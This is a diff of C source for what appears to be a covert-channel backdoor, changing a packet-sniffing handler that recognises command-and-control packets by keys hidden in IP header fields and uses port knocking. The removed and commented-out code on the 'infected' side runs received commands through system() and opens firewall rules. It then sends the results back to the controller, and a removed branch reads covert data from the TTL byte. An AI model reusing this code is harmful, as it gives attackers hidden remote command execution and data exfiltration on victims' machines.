@@ -56,7 +56,6 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
     u_int hlen,off,version;
     int len;
 
-    //skip past the ethernet header
     ip = (struct my_ip*)(packet + sizeof(struct ether_header));
     length-= sizeof(struct ether_header);
 
@@ -69,6 +68,7 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
     version = IP_V(ip);
     off = ntohs(ip->ip_off);
 
+    //if the packet is the wrong version and size exit
     if(version != 4){
         perror("Unknown error");
         exit(1);
@@ -78,96 +78,78 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
     } else if((int)length < len){
         perror("Truncated IP");
         exit(1);
-    } else if(ip->ip_p == IPPROTO_UDP){
+    }
+
+    if(ip->ip_p == IPPROTO_UDP){
         printf("Protocal: UDP\n");
         printf("IPID: %c\n", ip->ip_id);
         printf("TOS: %c\n", ip->ip_tos);
         printf("TTL: %c\n", ip->ip_ttl);
         printf("Infected: %d\n", Filter->infected);
+
         if(CheckKey(ip->ip_tos, ip->ip_id, true)){
+            //only CNC will get into this loop
             //port knocking packet
-            const struct sniff_udp *udp;
-            int size_udp;
-            int size_ip = IP_HL(ip)*4;
-            udp = (struct sniff_udp*)(packet + 14 + size_ip);
-            size_udp = 8;
-            printf("Src port: %d\n", ntohs(udp->uh_sport));
-            printf("Dst port: %d\n", ntohs(udp->uh_dport));
-            for(int k = 0; k < Filter->amount; k++){
-                if(Filter->port_ushort[k] == udp->uh_sport){
-                    printf("");
-                    Filter->pattern[k] = 1;
+            if(Filter->infected == false){
+                const struct sniff_udp *udp;
+                udp = (struct sniff_udp*)(packet + 14 + (IP_HL(ip)*4));
+
+                printf("Src port: %d\n", ntohs(udp->uh_sport));
+                printf("Dst port: %d\n", ntohs(udp->uh_dport));
+                for(int k = 0; k < Filter->amount; k++){
+                    if(Filter->port_ushort[k] == udp->uh_sport){
+                        printf("PORT KNOCKING ON %c", ntohs(udp->uh_dport));
+                        Filter->pattern[k] = 1;
+                    }
+                }
+
+                printf("Filter->pattern[0]: %d\n", Filter->pattern[0]);
+                printf("Filter->pattern[1]: %d\n", Filter->pattern[1]);
+                if((Filter->pattern[0] == 1) && (Filter->pattern[1] == 1)){
+                    //iptables(Filter->targetip, "udp", PORT, true, false);
+                    //char *dip = Filter->targetip;
+                    printf("WAITING FOR DATA\n");
+                    //port is open
+                    //recv results
+                    //recv_covert_udp
+                    //iptables(Filter->targetip, "tcp", PORT, true, true);
+                    //pcap_breakloop(interfaceinfo);
                 }
             }
-            printf("Filter->pattern[0]: %d\n", Filter->pattern[0]);
-            printf("Filter->pattern[1]: %d\n", Filter->pattern[1]);
-            if((Filter->pattern[0] == 1) && (Filter->pattern[1] == 1)){
-                iptables(Filter->targetip, "udp", PORT, true, false);
-                char *dip = Filter->targetip;
-                printf("WAITING FOR DATA\n");
-                iptables(Filter->targetip, "tcp", PORT, true, true);
-                pcap_breakloop(interfaceinfo);
-            }
-        } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'r' && Filter->infected == false){
-            //CNC
-            //close loop end of results
-            printf("EXIT LOOP");
-            pcap_breakloop(interfaceinfo);
-        } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'r' && Filter->infected == true) {
-            //infected
-            //dont close
-            printf("EXIT LOOP");
-            pcap_breakloop(interfaceinfo);
-        } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'c' && Filter->infected == false){
-            //CNC
-            //
-        } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'c' && Filter->infected == true){
-            //infected
-            //open iptables
-            //port knock
-            //send results
-            //close loop end of results
-            FILE *file;
-            if((file = fopen(FILENAME, "wb+")) < 0){
-                perror("fopen");
-                exit(1);
-            }
-            system(CHMOD);
-            system(CMD);
-            //open outbound rule
-            iptables(Filter->targetip, "udp", PORT, false, false);
-            printf("COMMAND RECEIEVED \n");
-            //sending the results back to the CNC
-            printf("PORT KNOCKING\n");
-            PortKnocking(Filter, NULL, NULL, true, false);
-            printf("SENDING RESULTS\n");
-            send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE);
-            iptables(Filter->targetip, "tcp", PORT, false, true);
-            printf("\n");
-            printf("\n");
-            printf("Waiting for new command\n");
-            } else {
-            printf("parsing udp packet\n");
-            }
+        } else if(ip->ip_id == 'r' && ip->ip_tos == 'r' && ip->ip_ttl == 'r'){
+            if(Filter->infected){
+                //results
+                //infected
+                //open iptables
+                //port knock
+                //send results
+                //close loop end of results
+                //recv_data loop create for UDP
+                /*FILE *file;
+                if((file = fopen(FILENAME, "wb+")) < 0){
+                    perror("fopen");
+                    exit(1);
+                }
+                system(CHMOD);
+                system(CMD);
+                //open outbound rule
+                iptables(Filter->targetip, "udp", PORT, false, false);
+                printf("COMMAND RECEIEVED \n");
+                //sending the results back to the CNC
+                printf("PORT KNOCKING\n");
+                PortKnocking(Filter, NULL, NULL, true, false);
+                printf("SENDING RESULTS\n");
+                send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE);
+                iptables(Filter->targetip, "udp", PORT, false, true);
+                printf("\n");
+                printf("\n");
+                printf("Waiting for new command\n");*/
 
-
-            printf("EXIT LOOP");
-            pcap_breakloop(interfaceinfo);
-    }
-        if(CheckKey(ip->ip_tos, ip->ip_id, false)){
-            //normal packet
-            FILE *file;
-            if((file = fopen(FILENAME, "a+b")) < 0){
-                perror("fopen");
-                exit(1);
             }
-            printf("Output: %c\n", ip->ip_ttl);
-            fprintf(file, "%c", ip->ip_ttl);
-            fflush(file);
-            fclose(file);
-            //port knocking packet
-
+        } else {
+            printf("Wrong key tossing packet\n");
         }
+    }
 }
 
 void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
